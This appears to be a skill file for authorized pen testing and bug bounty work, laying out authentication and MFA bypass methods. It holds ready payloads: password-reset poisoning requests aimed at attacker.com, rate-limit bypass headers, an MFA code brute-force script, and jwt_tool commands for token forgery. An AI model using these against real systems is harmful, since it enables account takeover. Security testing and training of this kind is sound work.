---
name: auth-bypass-methodology
description: "Authentication and MFA bypass methodology for bug bounty and authorized pen testing. Covers: username enumeration, rate limit bypass (IP/account/endpoint), password reset poisoning, MFA bypass (direct endpoint, response manipulation, brute-force, enrollment race), session token entropy analysis, JWT-specific attacks (alg confusion, alg:none, JWK injection, kid path traversal, jku spoofing). 14 PortSwigger labs. Critical-tier bounty ceiling (account takeover)."
trigger_keywords: "auth bypass, mfa bypass, password reset, rate limit bypass, username enum, session token, login bypass, 2fa bypass, totp bypass, mfa rate limit, jwt auth, authentication bypass, account lockout bypass, brute force bypass, forgot password, reset token"
version: 1.0
created: 2026-02-25
owner: cyber-operator
---

# Authentication & MFA Bypass Methodology

## Purpose

Systematic methodology for attacking authentication — the primary gate between anonymous attacker and valid session. Covers brute-force, reset poisoning, MFA bypass, JWT attacks. Critical bounty ceiling (account takeover).

---

## Authentication Surface Map

```
├── Login: /login, /api/v1/auth/login, /api/v2/auth/login, /mobile-api/login
├── Registration: /register, /api/v1/auth/register, /invite?token=
├── Password Reset: /forgot-password, /reset-password?token=
├── MFA: /mfa/setup, /mfa/verify, /mfa/disable, /mfa/backup-codes
├── Session: /logout, /api/v1/auth/refresh, /api/v1/auth/revoke
├── Recovery: /security-questions, /recovery-email, /support/account-recovery
└── SSO: /auth/google, /auth/saml, /auth/callback
```

---

## Rate Limit Bypass Techniques

```
IP-based bypass:
  X-Forwarded-For: 127.0.0.1
  X-Real-IP: 10.0.0.${RANDOM}
  X-Originating-IP: ${RANDOM_IP}
  True-Client-IP: ${RANDOM_IP}

Account-based bypass:
  Case variation: admin, Admin, ADMIN
  Whitespace: " admin", "admin "
  Unicode: аdmin (Cyrillic U+0430)
  Plus addressing: admin+test1@email.com
  JSON escape: {"username": "adm\u0069n"}

Endpoint bypass:
  /api/v1/login vs /api/v2/login vs /mobile-api/login
  HTTP method switching (POST → PUT)
  Content-Type switching (JSON ↔ form-urlencoded)
  Parameter pollution: /login?username=admin (body: username=admin)
```

---

## Password Reset Poisoning

```http
# Direct Host replacement
POST /forgot-password HTTP/1.1
Host: attacker.com

# X-Forwarded-Host override
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Dual Host headers
POST /forgot-password HTTP/1.1
Host: target.com
Host: attacker.com

# Host port injection
POST /forgot-password HTTP/1.1
Host: target.com:@attacker.com
```
Evidence: Use Burp Collaborator. Capture interaction when victim clicks the link.

---

## MFA Bypass Techniques

**Bypass 1 — Direct endpoint access:**
```
1. POST /login → mfa_pending=true in session
2. Skip /mfa/verify → navigate directly to /dashboard
If app checks authentication but NOT mfa_verified → bypass
```

**Bypass 2 — Response manipulation:**
```
Intercept POST /mfa/verify response
Change: HTTP/1.1 401 {"error":"Invalid code"}
To:     HTTP/1.1 200 {"success":true,"redirect":"/dashboard"}
```

**Bypass 3 — MFA code brute-force (Turbo Intruder):**
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          engine=Engine.BURP2)
    for code in range(0, 999999):
        engine.queue(target.req, str(code).zfill(6))
```

**Bypass 4 — Backup code weaknesses:**
- Not invalidated after use
- Predictable generation
- Unlimited attempts
- No re-auth to generate new codes

**Bypass 5 — Enrollment race:**
```
1. Start MFA enrollment → get secret/QR
2. Simultaneously: send /mfa/disable AND /mfa/verify with TOTP
3. If disable succeeds but session retains mfa_verified=true → account has no MFA
```

**Bypass 6 — SSO step-down:**
```
SSO flow (Google/GitHub without MFA) bypasses app-level MFA requirement
```

---

## Session Token Analysis

```
1. Collect 100+ tokens → Burp Sequencer analysis
2. Decode: Base64, URL-decode, hex-decode
3. JWT check: three base64url segments separated by dots
4. Cookie attributes: HttpOnly, Secure, SameSite, Domain, Path, Expires
5. Session lifecycle:
   - Changes after login? (session fixation)
   - Changes after privilege? (escalation prevention)
   - Invalidated on logout server-side?
```

---

## JWT Attack Quick Reference

```bash
# Decode and analyze
python3 jwt_tool.py <TOKEN>

# alg:none
python3 jwt_tool.py <TOKEN> -X a

# RS256 → HS256 key confusion (sign with server's public key as HS256 secret)
python3 jwt_tool.py <TOKEN> -X k -pk server_public.pem

# JWK injection (serve attacker's own key in token header)
python3 jwt_tool.py <TOKEN> -X i

# kid path traversal (point to /dev/null → empty signing key)
# Manual: set "kid":"../../../../dev/null", sign with empty string

# jku spoofing (host your JWKS, point jku to attacker.com)
python3 jwt_tool.py <TOKEN> -X s

# Brute-force HS256 secret
python3 jwt_tool.py <TOKEN> -C -d wordlist.txt
```

---

## PortSwigger Coverage

14 labs (Apprentice → Expert) — Authentication category on PortSwigger Web Academy.

---

## Evidence Standards

- Username enum: Screenshot showing different response (length/status/timing) for valid vs invalid users
- Rate limit bypass: Show N successful attempts with modified headers
- Reset poisoning: Burp Collaborator interaction showing token received
- MFA bypass: Screenshot of /dashboard accessed without completing MFA
- JWT forgery: Request with forged token + successful response

*auth-bypass-methodology.md v1.0 | owner: cyber-operator | 2026-02-25*
